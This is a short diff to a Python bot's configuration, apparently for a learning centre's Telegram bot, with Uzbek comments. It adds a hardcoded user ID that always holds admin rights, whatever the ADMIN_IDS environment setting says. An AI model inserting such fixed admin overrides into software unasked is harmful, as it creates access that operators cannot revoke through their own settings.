@@ -42,6 +42,8 @@ GROUP_CHAT_ID = int(os.getenv("GROUP_CHAT_ID", "-5489791329"))
 ADMIN_IDS = {
     int(x) for x in os.getenv("ADMIN_IDS", "625900787").replace(",", " ").split()
 }
+# Doimiy qo'shimcha admin — Railway'dagi ADMIN_IDS'dan qat'i nazar har doim admin.
+ADMIN_IDS |= {8539651140}
 
 # O'quv markazning markaziy nuqtasi (lokatsiyasi) — BOSHLANG'ICH qiymat.
 # Botda admin "📍 Markaz joylashuvi" tugmasi orqali buni istalgan vaqtda
